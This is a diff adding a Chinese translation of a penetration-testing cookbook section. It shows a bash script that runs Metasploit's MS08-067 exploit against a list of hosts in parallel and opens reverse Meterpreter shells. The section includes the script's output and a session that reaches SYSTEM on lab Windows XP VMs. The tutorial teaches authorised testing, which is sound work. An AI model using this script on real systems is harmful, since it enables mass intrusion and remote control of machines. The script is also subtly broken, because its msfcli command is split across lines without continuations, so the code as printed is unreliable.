@@ -316,3 +316,87 @@ sync:x:4:65534:sync:/bin:/bin/sync
 
 Nessuscmd 是 Nessus 漏洞扫描器中包含的命令行工具。 此工具可用于通过直接从终端执行目标扫描，来扫描和评估不同插件的结果。 因为该工具（如 MSFCLI）可以轻易从 bash 终端调用，所以我们很容易构建一个脚本，将两个任务串联到一起，将漏洞扫描与利用相结合。
 
+## 8.5 使用反向 Shell 载荷的多线程 MSF 漏洞利用
+
+使用 Metasploit 框架执行大型渗透测试的一个困难，是每个利用必须按顺序单独执行。 如果你想确认大量系统中单个漏洞的可利用性，单独利用每个漏洞的任务可能变得乏味。 幸运的是，通过结合 MSFCLI 和 bash 脚本的功能，可以通过执行单个脚本，轻易在多个系统上同时执行攻击。 该秘籍演示了如何使用 bash 在多个系统中利用单个漏洞，并为每个系统打开一个 Meterpreter shell。
+
+### 准备
+
+要使用此秘籍中演示的脚本，您=你需要访问多个系统，每个系统都具有可使用 Metasploit 利用的相同漏洞。 提供的示例复制了运行 Windows XP 漏洞版本的 VM，来生成 MS08-067 漏洞的三个实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节还需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。
+
+### 操作步骤
+
+下面的示例演示了如何使用 bash 脚本同时利用单个漏洞的多个实例。 特别是，此脚本可用于通过引用 IP 地址的输入列表来利用 MS08-067 NetAPI 漏洞的多个实例：
+
+```sh
+#!/bin/bash
+if [ ! $1 ]; then echo "Usage: #./script <host file> <LHOST>"; 
+exit; fi
+
+iplist=$1 
+lhost=$2
+
+i=4444 
+for ip in $(cat $iplist) 
+do   
+    gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi 
+    PAYLOAD=windows/meterpreter/reverse_tcp 
+    RHOST=$ip LHOST=$lhost LPORT=$i E   
+    echo "Exploiting $ip and establishing reverse connection on local port $i" 
+i=$(($i+1)) 
+done 
+```
+
+脚本使用`for`循环，对输入文本文件中列出的每个 IP 地址执行特定任务。 该特定任务包括启动一个新的 GNOME 终端，该终端又执行必要的`msfcli`命令来利用该特定系统，然后启动反向 TCP meterpreter shell。 因为`for`循环为每个 MSFCLI 漏洞启动一个新的 GNOME 终端，每个都作为一个独立的进程执行。 以这种方式，多个进程可以并行运行，并且每个目标将被同时利用。 本地端口值被初始化为 4444，并且对被利用的每个附加系统增加 1，使每个 meterpreter shell 连接到不同的本地端口。 因为每个进程在独立的 shell 中执行，所以这个脚本需要从图形桌面界面执行，而不是通过 SSH 连接执行。 `./multipwn.sh bash shell`可以执行如下：
+
+```
+root@KaliLinux:~# ./multipwn.sh 
+Usage: #./script <host file> <LHOST> 
+root@KaliLinux:~# ./multipwn.sh iplist.txt 172.16.36.239 
+Exploiting 172.16.36.132 and establishing reverse connection on local port 4444 
+Exploiting 172.16.36.158 and establishing reverse connection on local port 4445 
+Exploiting 172.16.36.225 and establishing reverse connection on local port 4446
+```
+
+如果在不提供任何参数的情况下执行脚本，脚本将输出相应的用法。 该使用描述将表明，该脚本以定义监听 IP 系统的`LHOST`变量，以及包含目标 IP 地址列表的文本文件的文件名来执行。 一旦以这些参数执行，会开始弹出一系列新的终端。 这些终端中的每一个将运行输入列表中的 IP 地址之一的利用序列。 原始的执行终端将在执行时输出进程列表。 所提供的示例利用了三个不同的系统，并且为每个系统打开单独的终端。其中一个终端的示例如下：
+
+```
+[*] Please wait while we load the module tree...
+     ,           ,    
+    /             \  
+   ((__---,,,---__))   
+      (_) O O (_)_________    
+         \ _ /            |\    
+          o_o \   M S F   | \  
+               \   _____  |  *    
+                |||   WW|||      
+                |||     |||
+                
+Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with Metasploit Pro -- type 'go_pro' to launch it now.
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0] 
++ -- --=[ 1053 exploits - 590 auxiliary - 174 post 
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+PAYLOAD => windows/meterpreter/reverse_tcp 
+RHOST => 172.16.36.225 
+LHOST => 172.16.36.239 
+LPORT => 4446 
+[*] Started reverse handler on 172.16.36.239:4446 
+[*] Automatically detecting the target... 
+[*] Fingerprint: Windows XP - Service Pack 2 - lang:English 
+[*] Selected Target: Windows XP SP2 English (AlwaysOn NX) 
+[*] Attempting to trigger the vulnerability...
+[*] Sending stage (752128 bytes) to 172.16.36.225 
+[*] Meterpreter session 1 opened (172.16.36.239:4446 -> 172.16.36.225:1950) at 2014-04-10 07:12:44 -0400
+
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM 
+meterpreter >
+```
+
+每个终端启动单独的 MSFCLI 实例并执行利用。 假设攻击成功，会执行载荷，并且交互式 Meterpreter shell 将在每个单独的终端中可用。
+
+### 工作原理
+
+通过对每个进程使用单独的终端，可以使用单个 bash 脚本执行多个并行利用。 另外，通过使用为`LPORT`分配的递增值，可以同时执行多个反向 meterpreter shell。
